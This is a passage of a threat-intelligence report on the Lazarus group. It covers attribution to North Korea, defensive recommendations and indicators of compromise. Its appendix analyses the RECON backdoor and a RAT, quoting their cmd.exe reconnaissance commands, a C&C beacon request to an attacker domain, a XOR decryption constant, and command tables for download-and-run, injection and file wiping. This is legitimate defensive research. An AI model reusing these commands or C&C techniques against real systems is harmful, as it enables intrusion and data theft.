+<ORG>Reconnaissance General Bureau</ORG>
+
+Starting in <TIMESTAMP>2016</TIMESTAMP>, the <THREAT_ACTOR>Lazarus</THREAT_ACTOR> group tried to mask their activity by 
+pretending to be Russian hackers: 
+
+1. The <MALWARE>Client_TrafficForwarder</MALWARE> module includes debugging symbols and 
+strings containing Russian words in descriptions of commands received by 
+malware from the C&C server. 
+ 
+It’s worth noting that "Russian commands" received from the server are 
+not typical for a Russian native speaker, and in the case of the «poluchit» 
+(to receive) command the meaning of the word contradicts the action (to 
+send) it is intended for. 
+ 
+ 
+  
+ 
+
+2. To protect their executables, hackers used <TOOL>Enigma Protector</TOOL>, a commercial 
+product, which was created by a Russian software developer.
+
+3. Exploits for <SOFTWARE>Flash</SOFTWARE> and <SOFTWARE>SilverLight</SOFTWARE> were borrowed from the sets of exploits 
+created by Russian-speaking hackers. 
+
+These techniques to mask attribution initially mislead some researchers 
+conducting preliminary analysis.
+
+3.2  Masquerading as Russian hackers
+
+Poluchit (means "to get" in Russian)                Send a network address of the current 
+
+Layer 2 server to the C&C server 
+
+The <THREAT_ACTOR>DarkSeoul</THREAT_ACTOR> group (aka <THREAT_ACTOR>Lazarus</THREAT_ACTOR>) is controlled by Bureau 121, a division of the 
+<ORG>Reconnaissance General Bureau</ORG>, a <ORG>North Korean intelligence agency</ORG>. <ORG>Bureau 121</ORG> 
+is responsible for conducting military cyber campaigns.
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution18
+
+RECOMMENDATIONS04
+
+Updates of software and operating systems
+
+To prevent infection through execution of exploits, it is enough to update 
+your <SOFTWARE>Microsoft</SOFTWARE> and <SOFTWARE>Adobe</SOFTWARE> software.The <THREAT_ACTOR>Lazarus</THREAT_ACTOR> group uses known and 
+patched exploits, rather than leveraging 0day vulnerabilities. That’s why, 
+even usual software updates did not allow attackers to infiltrate corporate 
+networks. Unfortunately, some of the attacked <INDUSTRY>banks</INDUSTRY> did not comply with this 
+requirement.
+
+Network traffic analysis
+
+Even if the criminals have managed to obtain access to the corporate 
+network, the attack can still be successfully prevented. After intrusion into the 
+company’s network hackers still need to find systems of their interest, and 
+gain access to them. It takes days and even months sometimes, and this time 
+should be used to detect the malicious activity.
+
+Attackers use malicious programs that transfer data to the C&C server — 
+Layer 1. Communications between the infected computer and the C&C server 
+can be identified through network traffic analysis. All communications are 
+encrypted, that is why you should use solutions that can detect network 
+anomalies based on threat intelligence data.
+
+Application whitelisting
+
+Application whitelisting should be introduced into critical bank servers. This 
+will prevent attackers from installing their remote control tools, monitoring 
+financial transactions, and escalating privileges. It also helps to identify 
+unauthorized attempts to run such malicious applications.
+
+Checking indicators of compromise
+
+The “Indicators of compromise” section contains current and historical 
+intelligence data. With these indicators, you can check if your organization 
+was, or is, under attack by <THREAT_ACTOR>Lazarus</THREAT_ACTOR>. The group uses legitimate compromised 
+servers, that’s why these indicators can give false positives.
+
+Response
+
+And the most important thing: if you have detected trails of a targeted attack 
+at any stage, you need to involve specialized companies for its analysis. 
+Incorrect responses to the attack result in the attacker activity remaining 
+partly undetected to enable criminals to achieve their goal — to steal money.
+
+4  Recommendations1   Key  
+Findings 
+
+2   Attack  
+preparation and 
+implementation
+
+3   Attack  
+organizers
+
+5  Indicators of 
+compromise
+
+6 Appendix 
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution19
+
+ABOUT  
+<ORG>Group-IB</ORG>
+
+<ORG>Group-IB</ORG> is one of the global leaders in preventing and investigating high-
+tech crimes and online fraud. <TIMESTAMP>Since 2003</TIMESTAMP>, the company has been active in the 
+field of computer forensics and information security, protecting the largest 
+international companies against financial losses and reputational risks.
+
+ 
+International honors
+
+The company is recognized by <ORG>Gartner</ORG> as a threat intelligence vendor with 
+strong cyber security focus and the ability to provide leading insight to the 
+Eastern European region and recommended by the <ORG>Organization for Security and Co-operation in Europe</ORG> (<ORG>OSCE</ORG>). In <TIMESTAMP>2017</TIMESTAMP> <ORG>IDC</ORG> Report named <ORG>Group-IB</ORG> the 
+leader of the Russian Threat Intelligence Services Market. The company is a 
+member of the <ORG>World Economic Forum</ORG> working group on cybersecurity.
+
+ 
+Clients worldwide
+
+Fortune 500 companies worldwide use <ORG>Group-IB</ORG> products and services. 
+<ORG>Group-IB</ORG> clients include top-tier <INDUSTRY>banks</INDUSTRY> and <INDUSTRY>financial</INDUSTRY> institutions, <INDUSTRY>FMCG brands</INDUSTRY> 
+and industrial corporations, <INDUSTRY>oil</INDUSTRY> and <INDUSTRY>gas</INDUSTRY> companies, software and hardware 
+vendors, <INDUSTRY>telecommunications</INDUSTRY> service providers the <COUNTRY>US</COUNTRY>, <COUNTRY>Western Europe</COUNTRY>, the 
+<COUNTRY>Middle East</COUNTRY>, <COUNTRY>Asia</COUNTRY> and <COUNTRY>Australia</COUNTRY>.
+
+ 
+CyberCrimeCon2017
+
+Annual conference organized by <ORG>Group-IB</ORG> aims to empower global threat 
+intelligence exchange in one of the hottest spot on cybersecurity map. Be the 
+first to discover key cybercrime trends and get a chance to interact with the 
+global experts directly, both on and off stage.  
+Learn more on 2017.group-ib.com
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution20
+
+<SOFTWARE>Threat Intelligence</SOFTWARE>
+
+Learn about threats, leakages, 
+attacks, and hacking activity 
+before they can harm your 
+business
+
+<SOFTWARE>TDS Sensor</SOFTWARE>  
++ <SOFTWARE>TDS Polygon</SOFTWARE>
+
+Detect malicious incidents in 
+your internal network to prevent 
+attacks, intrusions, data leaks, and 
+espionage
+
+<SOFTWARE>Incident Response</SOFTWARE>
+
+CERT-GIB — 24/7 emergency 
+response and effective incident 
+management
+
+<SOFTWARE>Secure Bank</SOFTWARE>
+
+Protect online payments by 
+identifying fraud preparation and 
+attempted execution on client 
+devices
+
+<SOFTWARE>Brand Protection</SOFTWARE>
+
+Prevent online brand abuse, 
+manage reputational risks and 
+reduce online counterfeit sales
+
+<SOFTWARE>Computer Forensics and Investigation</SOFTWARE>
+
+The largest computer forensics 
+laboratory in <COUNTRY>Eastern Europe</COUNTRY> with 
+150+ successful investigations 
+worldwide
+
+<ORG>Group-IB</ORG> products and services
+
+Learn more on group-ib.com
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution21
+
+5.1 IP addresses of attackers
+
+5.2  IP addresses with  
+<TOOL>SoftEther VPN</TOOL>
+
+INDICATORS  
+OF COMPROMISE
+
+IP Country Comment
+
+<IOC>175.45.178.222</IOC> <COUNTRY>North Korea</COUNTRY> Potonggang District, where <ORG>Natinal Defence Commission</ORG> 
+of <COUNTRY>North Korea</COUNTRY> is located
+
+<IOC>210.52.109.22</IOC> <COUNTRY>North Korea</COUNTRY> Located in the network of <ORG>China Netcom</ORG>
+
+<IOC>157.7.135.182</IOC> <COUNTRY>Japan</COUNTRY> VPN server with an agent <TOOL>SoftEther VPN</TOOL>
+<ORG>Japan Network Information Center</ORG> installed
+
+<IOC>202.101.36.45</IOC> <COUNTRY>China</COUNTRY> VPN server with an agent <TOOL>SoftEther VPN</TOOL>
+<ORG>Shanghai Telecom</ORG> installed
+
+IP Country Certificate name Comments
+
+<IOC>157.7.135.182</IOC> <COUNTRY>Japan</COUNTRY> vpn140818026.softether.net <ORG>Japan Network Information Center</ORG>
+
+<IOC>202.101.36.45</IOC> <COUNTRY>China</COUNTRY> vpn421337203.sedns.cn <ORG>Shanghai Telecom</ORG>
+
+<IOC>202.129.24.4</IOC> <COUNTRY>Thailand</COUNTRY> vpn334555897.softether.net <ORG>CAT-Northeast Telecom</ORG>
+
+<IOC>78.89.183.37</IOC> <COUNTRY>Kuwait</COUNTRY> vpn401107085.softether.net <ORG>Wataniya Telecom</OR>
+
+<IOC>31.3.225.57</IOC> <COUNTRY>USA<COUNTRY> vpn204475098.softether.net Dedicated server hosting
+
+<IOC>207.162.24.86</IOC> <COUNTRY>Canada</COUNTRY> vpn311153980.softether.net <ORG>Universite du Quebec</ORG>
+
+<IOC>209.254.82.137</IOC> <COUNTRY>USA</COUNTRY> vpn835666623.softether.net <ORG>PaeTec Communications, Inc. TELECOM</ORG>
+
+<IOC>77.241.47.234</IOC> <COUNTRY>Russia</COUNTRY> vpn656325103.softether.net <ORG>tvoe.tv</ORG>
+
+<IOC>173.198.127.221</IOC> <COUNTRY>USA</COUNTRY> vpn154284736.softether.net <ORG>Warner Bros. Entertainment Inc</ORG>
+
+<IOC>180.18.169.69</IOC> <COUNTRY>Japan</COUNTRY> vpn839766209.softether.net <ORG>Japan Network Information Center</ORG>
+
+<IOC>31.197.217.5</IOC> <COUNTRY>Italy</COUNTRY> vpn844692605.softether.net <ORG>Telecom Italia S.p.a.</ORG>
+
+<IOC>140.123.92.101</IOC> <COUNTRY>Taiwan</COUNTRY> vpn147623034.softether.net <ORG>Taiwan Network Information Center</ORG>
+
+<IOC>140.121.120.229</IOC> <COUNTRY>Taiwan</COUNTRY> vpn178828146.softether.net <ORG>Taiwan Network Information Center</ORG>
+
+05
+
+4  Recommendations1   Key  
+Findings 
+
+2   Attack  
+preparation and 
+implementation
+
+3   Attack  
+organizers
+
+5  Indicators of 
+compromise
+
+6 Appendix 
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution22
+
+5.3 IP addresses used to control the C&C infrastructure
+
+IP addresses of compromised  
+hosts with <MALWARE>ServerRAT</MALWARE>
+Listens on port 3365
+
+IP addresses of 
+compromised hosts 
+with PortForwarder
+Redirects to port 443
+
+IP addresses of compromised 
+hosts with <MALWARE>Backend_Listener</MALWARE>
+Listens on ports 8080 and 
+9090
+
+<IOC>140.121.120.229</IOC>
+
+<IOC>27.131.59.198</IOC>
+
+<IOC>194.78.90.21</IOC>
+
+<IOC>140.123.92.101</IOC>
+
+<IOC>31.210.105.105</IOC>
+
+<IOC>31.197.217.5</IOC>
+
+<IOC>182.77.60.35</IOC>
+
+<IOC>203.131.230.104</IOC>
+
+<IOC>80.60.105.128</IOC>
+
+<IOC>203.114.109.68</IOC>
+
+<IOC>165.123.67.111</IOC>
+
+<IOC>178.222.166.209</IOC>
+
+<IOC>140.114.122.178</IOC>
+
+<IOC>63.247.182.137</IOC>
+
+<IOC>140.121.100.63</IOC>
+
+<IOC>114.174.228.100</IOC>
+
+<IOC>202.183.185.90</IOC>
+
+<IOC>118.189.38.21</IOC>
+
+<IOC>203.66.57.237</IOC>
+
+<IOC>210.227.170.229</IOC>
+
+<IOC>180.18.169.69</IOC>
+
+<IOC>173.198.127.221</IOC>
+
+<IOC>86.120.134.50</IOC>
+
+<IOC>77.241.47.234</IOC>
+
+<IOC>182.73.40.130</IOC>
+
+<IOC>58.64.203.66</IOC>
+
+<IOC>81.93.72.18</IOC>
+
+<IOC>61.122.232.25</IOC>
+
+<IOC>209.254.82.137</IOC>
+
+<IOC>118.22.154.159</IOC>
+
+<IOC>207.162.24.86</IOC>
+
+<IOC>178.252.148.240</IOC>
+
+<IOC>212.14.44.245</IOC>
+
+<IOC>210.213.80.237</IOC>
+
+<IOC>180.234.11.19</IOC>
+
+<IOC>51.254.71.167</IOC>
+
+<IOC>41.41.241.194</IOC>
+
+<IOC>31.3.225.57</IOC>
+
+<IOC>69.91.178.16</IOC>
+
+<IOC>180.94.69.107</IOC>
+
+<IOC>218.29.194.101</IOC>
+
+<IOC>140.119.98.20</IOC>
+
+<IOC>64.116.135.73</IOC>
+
+<IOC>140.115.31.220</IOC>
+
+<IOC>78.89.183.37</IOC>
+
+<IOC>221.132.18.43</IOC>
+
+<IOC>190.252.8.138</IOC>
+
+<IOC>31.210.119.142</IOC>
+
+<IOC>61.90.156.121</IOC>
+
+<IOC>212.34.228.66</IOC>
+
+<IOC>196.214.247.58</IOC>
+
+<IOC>12.49.13.202</IOC>
+
+<IOC>41.72.101.138</IOC>
+
+<IOC>60.96.139.113</IOC>
+
+<IOC>80.78.73.204</IOC>
+
+<IOC>212.30.75.210</IOC>
+
+<IOC>87.252.182.182</IOC>
+
+<IOC>166.111.80.223</IOC>
+
+<IOC>140.116.31.195</IOC>
+
+<IOC>24.201.106.142</IOC>
+
+<IOC>41.33.212.94</IOC>
+
+<IOC>31.192.208.227</IOC>
+
+<IOC>193.19.174.60</IOC>
+
+<IOC>220.132.243.188</IOC>
+
+<IOC>69.196.83.206</IOC>
+
+<IOC>62.210.146.3</IOC>
+
+<IOC>208.124.153.14</IOC>
+
+<IOC>140.112.90.235</IOC>
+
+<IOC>47.176.2.12</IOC>
+
+<IOC>164.70.22.40</IOC>
+
+<IOC>211.240.78.135</IOC>
+
+<IOC>202.56.120.210</IOC>
+
+<IOC>184.163.74.15</IOC>
+
+<IOC>210.241.42.173</IOC>
+
+<IOC>218.248.46.26</IOC>
+
+<IOC>12.49.13.202</IOC>
+
+<IOC>31.210.105.105</IOC>
+
+<IOC>202.129.24.4</IOC>
+
+<IOC>210.213.90.173</IOC>
+
+<IOC>187.109.80.61</IOC>
+
+<IOC>212.219.35.51</IOC>
+
+<IOC>203.131.230.104</IOC>
+
+<IOC>2.32.113.178</IOC>
+
+<IOC>187.44.139.252</IOC>
+
+<IOC>123.200.9.178</IOC>
+
+<IOC>82.144.131.5</IOC>
+
+<IOC>202.183.185.91</IOC>
+
+<IOC>209.105.239.42</IOC>
+
+<IOC>209.81.121.51</IOC>
+
+<IOC>140.115.31.220</IOC>
+
+<IOC>80.78.73.204</IOC>
+
+<IOC>140.115.42.147</IOC>
+
+<IOC>212.14.44.245</IOC>
+
+<IOC>165.123.67.111</IOC>
+
+<IOC>66.207.112.187</IOC>
+
+<IOC>203.66.57.237</IOC>
+
+<IOC>140.116.178.123</IOC>
+
+<IOC>140.116.31.195</IOC>
+
+<IOC>140.112.14.16</IOC>
+
+<IOC>202.183.185.90</IOC>
+
+<IOC>41.72.101.138</IOC>
+
+<IOC>59.120.19.101</IOC>
+
+<IOC>125.214.195.17</IOC>
+
+<IOC>69.196.83.206</IOC>
+
+<IOC>175.45.61.44</IOC>
+
+<IOC>31.192.208.xxx</IOC>
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution23
+
+Certificate thumbprint “Issued for” Field Issue date IP addresses where 
+the certificate was 
+detected
+
+<IOC>de8166daca44cca2ef26031fd8a489222d8fa74c</IOC>
+
+www.longmusic.com/emailAddress=master@longmusic.com
+
+<TIMESTAMP>2017-02-09</TIMESTAMP> <IOC>12.49.13.202</IOC>
+<IOC>31.210.105.105</IOC>
+
+<IOC>b82ce23ef56fd59df2d54cd6ab0d097ec38a72bb</IOC>
+
+www.comtech.com/emailAddress=master@comtech.com
+
+<TIMESTAMP>2016-11-27</TIMESTAMP> <IOC>187.44.139.252</IOC>
+
+<IOC>1f2ae52ccf5ace9a27f521043816f8ca02405779</IOC>
+
+www.fartit.com/emailAddress=master@fartit.com
+
+<TIMESTAMP>2016-11-08</TIMESTAMP> <IOC>210.213.90.173</IOC>
+<IOC>187.109.80.61</IOC>
+<IOC>212.219.35.51</IOC>
+
+<IOC>6e55459ddbc666e5d6f89844f5d2a2647be426ca<IOC>
+
+www.wikaba.com/emailAddress=master@wikaba.com
+
+<TIMESTAMP>2016-11-07</TIMESTAMP> <IOC>202.129.24.4</IOC>
+
+<IOC>d35da9d13883b3f0c575144b3cee58d5744a9e48</IOC>
+
+www.telecomm.com/emailAddress=consult@www.telecom.com
+
+<TIMESTAMP>2016-11-07</TIMESTAMP> <IOC>203.131.230.104</IOC>
+
+<IOC>6bab9ca99fcdd465a56463a65122f9e7ba367219</IOC>
+
+www.instanthq.com/emailAddress=master@instanthq.com
+
+<TIMESTAMP>2016-11-01</TIMESTAMP> <IOC>2.32.113.178<IOC>
+
+<IOC>a8b0b4f42547aaf608f062c6f9aa1e3fb33caaf0</IOC>
+
+tradeboard.mefound.com/emailAddress=master@mefound.com
+
+<TIMESTAMP>2016-10-21</TIMESTAMP> <IOC>82.144.131.5</IOC>
+<IOC>202.183.185.91</IOC>
+
+<IOC>c84c214878ebbee35d853cb2f739f919238550a4</IOC>
+
+www.biolab.com/emailAddress=master@biolab.com
+
+<TIMESTAMP>2016-10-03</TIMESTAMP> <IOC>123.200.9.178</IOC>
+
+<IOC>935192f61d0a72cc24d01feab5a18de9a3837b42</IOC>
+
+www.resfinan.com/emailAddress=info@resfinan.com
+
+<TIMESTAMP>2016-08-18</TIMESTAMP> <IOC>209.105.239.42</IOC>
+<IOC>209.81.121.51</IOC>
+<IOC>182.77.60.35</IOC>
+<IOC>80.78.73.204</IOC>
+<IOC>140.115.31.220</IOC>
+<IOC>140.115.42.147</IOC>
+
+<IOC>26b4162e29de9c4a64b4dfd93b72c6426bc9dc8e</IOC>
+
+finews.otzo.com/emailAddress=master@otzo.com
+
+<TIMESTAMP>2016-04-10</TIMESTAMP> <IOC>41.72.101.138</IOC>
+<IOC>202.183.185.90</IOC>
+<IOC>140.112.14.16</IOC>
+<IOC>140.116.31.195</IOC>
+<IOC>140.116.178.123</IOC>
+<IOC>203.66.57.237</IOC>
+<IOC>66.207.112.187</IOC>
+<IOC>165.123.67.111</IOC>
+<IOC>212.14.44.245</IOC>
+<IOC>106.2.44.86</IOC>
+
+<IOC>f1f7c47c154a3f95cbc41a3299ce80a45e566519</IOC>
+
+host.global.com/emailAddress=info@host.global.com
+
+<TIMESTAMP>2016-03-21</TIMESTAMP> <IOC>69.196.83.206</IOC>
+<IOC>175.45.61.44</IOC>
+
+<IOC>57cfdf9b1e3a3675e5a971e1905f1ca5afd228bf</IOC>
+
+latest.ignorelist.com/emailAddress=consult@latest.ignorelist.com
+
+<TIMESTAMP>2016-03-03</TIMESTAMP> <IOC>59.120.19.101</IOC>
+<IOC>125.214.195.17</IOC>
+
+5.4  Certificates used  
+to redirect traffic
+
+4  Recommendations1   Key  
+Findings 
+
+2   Attack  
+preparation and 
+implementation
+
+3   Attack  
+organizers
+
+5  Indicators of 
+compromise
+
+6 Appendix 
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution24
+
+Hash Malware type File names
+
+<IOC>4cc10ab3f4ee6769e520694a10f611d5</IOC> <MALWARE>SilverLight exploit</MALWARE>  <IOC>cambio.xap</IOC>
+
+<IOC>6dffcfa68433f886b2e88fd984b4995a</IOC>
+<IOC>1f2cd85583a4a56b764ba6429c2155ec</IOC>
+
+<MALWARE>Flash exploit</MALWARE>  <IOC>cambio.swf</IOC>
+
+<IOC>cb52c013f7af0219d45953bae663c9a2</IOC>
+<IOC>9216b29114fb6713ef228370cbfe4045</IOC>
+
+<MALWARE>Reconnaissance module</MALWARE> <IOC>svchost.exe</IOC>
+
+<IOC>1bfbc0c9e0d9ceb5c3f4f6ced6bcfeae</IOC> <MALWARE>Dropper</MALWARE> <IOC>gpsvc.exe</IOC>
+
+<IOC>85d316590edfb4212049c4490db08c4b</IOC>
+<IOC>1f7897b041a812f96f1925138ea38c46</IOC>
+<IOC>1507e7a741367745425e0530e23768e6</IOC>
+
+<MALWARE>Dropper</MALWARE> <IOC>MBLCTR.EXE</IOC>
+<IOC>gpsvc.exe</IOC>
+
+<IOC>9914075cc687bdc352ee136ac6579707</IOC> <MALWARE>Loader</MALWARE> <IOC>fdsvc.exe</IOC>
+
+<IOC>9cc6854bc5e217104734043c89dc4ff8</IOC> <MALWARE>Client_TrafficForwarder</MALWARE> <IOC>fdsvc.dll</IOC>
+
+<IOC>25200d3fe30785f3c90a91faf8ebf1b5</IOC>
+<IOC>5994a8fd8c68dd1cc51ce7ca0d9c2749</IOC>
+<IOC>889e320cf66520485e1a0475107d7419</IOC>
+<IOC>40e698f961eb796728a57ddf81f52b9a</IOC>
+
+<MALWARE>Client_TrafficForwarder</MALWARE>
+
+<IOC>8e32fccd70cec634d13795bcb1da85ff</IOC> <MALWARE>Client_RAT</MALWARE> <IOC>srservice.hlp</IOC>
+
+<IOC>e29fe3c181ac9ddbb242688b151f3310</IOC> <MALWARE>Client_RAT</MALWARE> <IOC>deskadp.dll</IOC> 
+<IOC>srservice.dll</IOC>
+
+<IOC>9216b29114fb6713ef228370cbfe4045</IOC> <MALWARE>Client_RAT</MALWARE> <IOC>srservice.chm</IOC>
+
+<IOC>570e6ea21cdce694a4a74876ca87534a</IOC> <MALWARE>ServerRAT</MALWARE> <IOC>ejbss.dll</IOC>
+
+<IOC>e4fb05a8c2da92ec5b19bdb59814464a</IOC> <MALWARE>ServerRAT</MALWARE> <IOC>mbcrs.rll</IOC>
+
+<IOC>f38f6d976e6d66abc86f9992e808670a</IOC> <MALWARE>ServerRAT</MALWARE> <IOC>smtp.dat</IOC>
+
+<IOC>3c3982d068bc7f2d1e4742c2009b0f46</IOC> <MALWARE>Server_TrafficForwarder</MALWARE> <IOC>msvmgr.exe</IOC>
+
+<IOC>b603a16a950056df336fe3950c81601d</IOC>
+<IOC>d032aeb54cf1229e011c070ecd64c33e</IOC>
+
+<MALWARE>Server_TrafficForwarder</MALWARE> <IOC>msdtc.exe</IOC>
+
+<IOC>5C1917F6753D03A08328132DB1E06571</IOC> <MALWARE>BACKEND_LISTENER</MALWARE> <IOC>msdtc.exe</IOC>
+
+5.5  Malware
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution25
+
+APPENDIX06
+
+<MALWARE>RECON</MALWARE> module
+
+The <IOC>svchost.exe</IOC> file (MD5 <IOC>cb52c013f7af0219d45953bae663c9a2</IOC>, size 128512 
+bytes) is a <MALWARE>Backdoor</MALWARE>. This program is installed and launched on the target 
+machine through successful execution of exploits.
+
+Once launched, the program adds itself to the auto-start by copying its file to the 
+directory “%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\
+Programs\Startup”, collects information about the infected machine and sends it 
+to the C&C server.
+
+In addition, it can download and run third-party programs. The following 
+commands are executed using a command interpreter:
+
+«cmd.exe /c \»hostname > %s\»», &TempFileName);
+
+«cmd.exe /c \»whoami >> %s\»», &TempFileName);
+
+«cmd.exe /c \»ver >> %s\»», &TempFileName);
+
+«cmd.exe /c \»ipconfig -all >> %s\»», &TempFileName);
+
+«cmd.exe /c \»ping www.google.com >> %s\»», &TempFileName);
+
+«cmd.exe /c \»query user >> %s\»», &TempFileName);
+
+«cmd.exe /c \»net user >> %s\»», &TempFileName);
+
+«cmd.exe /c \»net view >> %s\»», &TempFileName);
+
+«cmd.exe /c \»net view /domain >> %s\»», &TempFileName);
+
+4  Recommendations1   Key  
+Findings 
+
+2   Attack  
+preparation and 
+implementation
+
+3   Attack  
+organizers
+
+5  Indicators of 
+compromise
+
+6 Appendix 
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution26
+
+exe /c \»reg query \»HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet 
+Settings\» >> %s\»»,
+
+«cmd.exe /c \»tasklist /svc >> %s\»», &TempFileName);
+
+«cmd.exe /c \»netstat -ano | find \»TCP\» >> %s\»», &TempFileName);
+
+}
+
+The analyzed sample can download and run executable files on 
+command from the C&C server (the "http" command). The "killkill" 
+command, used for self-removal from the infected system, applies a 
+hard-coded name of a .BAT file "<IOC>%temp%\tmp095j.bat</IOC>". 
+
+An example of a request to the C&C server is shown below:
+
+GET /design/dfbox/list.jsp?action=What&u=10729854751740 HTTP/1.1
+
+Connection: Keep-Alive
+
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 
+Firefox/47.0
+
+Host: www.eye-watch[.]in
+
+Below is a code block with a command request sent to the C&C 
+server:
+
+Command Description
+
+killkill Remove itself from the system
+
+http Download and run the file from the C&C server
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution27
+
+Below is a code block informing the C&C server about the results of 
+file loading and execution commands:
+
+Below is a code block informing the C&C server about the results of 
+self-removal commands:
+
+4  Recommendations1   Key  
+Findings 
+
+2   Attack  
+preparation and 
+implementation
+
+3   Attack  
+organizers
+
+5  Indicators of 
+compromise
+
+6 Appendix 
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution28
+
+Below is a code block informing the C&C server about results of the 
+data system collection command: 
+
+This remote control tool is installed on command from <MALWARE>RECON</MALWARE>, in the 
+event the computer is of interest to the attacker. The application is 
+deployed as follows: <MALWARE>Dropper</MALWARE> -> <MALWARE>Loader</MALWARE> -> <MALWARE>Payload</MALWARE>.
+
+The <IOC>gpsvc.exe</IOC> file (MD5: <IOC>1bfbc0c9e0d9ceb5c3f4f6ced6bcfeae</IOC>, size: 
+3449344 bytes) is an executable file and can be classified as <MALWARE>Dropper</MALWARE>. 
+This file is downloaded on the target system using <MALWARE>RECON</MALWARE>. 
+
+This console utility can be launched with the following arguments:
+
+<MALWARE>Client_RAT</MALWARE>
+
+Arguments Description
+
+<IOC>gpsvc.exe</IOC> -l Enumerates system services
+
+<IOC>gpsvc.exe</IOC>  -e [path] Extracts and decrypts the payload and saves it to the 
+specified path
+
+<IOC>gpsvc.exe</IOC> –a [service name] 
+[path to DLL]
+
+Installs the library as a service 
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution29
+
+The <IOC>deskadp.dll</IOC> and <IOC>srservice.dll</IOC> files (MD5: <IOC>e29fe3c181ac9ddbb242688b151f3310</IOC>, size: 79360 bytes) are executable dynamic libraries and 
+can be classified as <MALWARE>Loader</MALWARE>. These files are downloaded on the target 
+system using <MALWARE>RECON</MALWARE> and can ensure its persistence in the system using 
+<MALWARE>Dropper</MALWARE>.
+
+<MALWARE>Loader</MALWARE> is used to decrypt <MALWARE>Payload</MALWARE>. The encrypted file named 
+<IOC>srservice.chm</IOC> (MD5: <IOC>9216b29114fb6713ef228370cbfe4045</IOC>) is a <MALWARE>RAT</MALWARE>, 
+which is saved (in encrypted form) to the directory “%windir%\Help\X.
+chm”, where X is the name of the RAT file without an extension.
+
+An additional file named <IOC>srservice.hlp</IOC> (MD5: <IOC>8e32fccd70cec634d13795bcb1da85ff</IOC>) is a RAT configuration file, which contains a C&C address 
+embedded in an encrypted form.
+
+The decrypted configuration file contains the following network 
+addresses:
+
+• <IOC>tradeboard.mefound.com</IOC>:443
+
+• <IOC>movis-es.ignorelist.com</IOC>:443
+
+In addition to configuration data, the file contains a built-in encrypted 
+network address of the <IOC>tradeboard.mefound.com</IOC>:443 node.
+
+The strings are encrypted with a simple XOR operation of every 
+subsequent 2 bytes with a constant 0x2CDF.
+
+4  Recommendations1   Key  
+Findings 
+
+2   Attack  
+preparation and 
+implementation
+
+3   Attack  
+organizers
+
+5  Indicators of 
+compromise
+
+6 Appendix 
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution30
+
+Below is the buffer with the result of strings’ decryption.
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution31
+
+The application provides an option to specify the second network 
+node, however it was not specified in the file identified and analyzed by 
+<ORG>Group-IB</ORG> specialists.
+
+After its launch, <IOC>srservice.dll</IOC> scans the % windir%\Help\ directory for a 
+file with the same name, but with the .chm extension, then decrypts and 
+injects it into the address space of the lsass.exe process.
+
+Following this, the infected computer is controlled through a pre-
+installed infrastructure with several layers of anonymization designed to 
+complicate investigation.
+
+The <MALWARE>RAT</MALWARE> contains usual commands in English. Communications with the 
+C&C server are performed over an encrypted SSL channel as the <MALWARE>Client_RAT</MALWARE> is compiled with statically linked libcurl libraries, version 7.47.1 (<TIMESTAMP>FEB 2016</TIMESTAMP>).
+
+This program may execute the following commands received from the 
+C&C server: 
+
+Command Description
+
+NONE Do not execute any commands
+
+GINF Collects and sends extensive system information about the PC
+
+SLEP Do not execute any commands
+
+HIBN Do not execute any commands
+
+DRIV Get information about available disks in the system
+
+DIRP List files with the specified extension
+
+CHDR Changes the current directory
+
+RUNX Get the user's token
+
+MOVE Renames the specified file
+
+FTIM Set the timestamps of the %windir%/system32/kernel32.dll file to the 
+specified file
+
+NEWF Create a new directory with the specified name
+
+ZDWN Purportedly, downloads a file/files
+
+PEIN Inject the code in the specified process
+
+TCON Purportedly, it connects to the specified network node
+
+DIR Enumerates files in the selected directory
+
+DIE Remove itself from the system
+
+DEL Delete the selected file
+
+WIPE Delete the selected file and make it unrecoverable
+
+4  Recommendations1   Key  
+Findings 
+
+2   Attack  
+preparation and 
+implementation
+
+3   Attack  
+organizers
+
+5  Indicators of 
+compromise
+
+6 Appendix 
+
+
+
+<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
+architecture, tools, attribution32
+
+Arguments Description
+
+<IOC>dropper.exe<IOC> -x [key] -l Enumerates system services
+
+<IOC>dropper.exe</IOC> -x [key] -e 
+[servicename] [config]
+
+Extracts and decrypts the payload from config and sets it as a service
+
+<IOC>dropper.exe</IOC> -x [key] -f Installs implants by adding information about them to the system 
+registry
+
+<IOC>dropper.exe</IOC> -x [key] -o 
+[eventname]
+
+Calls OpenEventA with a special event name
+
+<IOC>dropper.exe</IOC> -x [key] -t 
+[eventname]
+
+Calls OpenEventA with a special event name, then calls Setvent API
+
+UPLD Upload the file to the C&C server
+
+SCFG Get a new bot configuration
+
+DRIV List the installed drivers
+
+DOWN Download and run the file
+
+CMDL Execute the command and upload the result of its operation to the C&C 
+server
+
+GCFG Download bot configuration
+
+RUN Run the command
+
+PVEW List running processes
+
+PEEX Inject the code in the explorer.exe process.
+
+PKIL Terminate the process with the selected PID
+
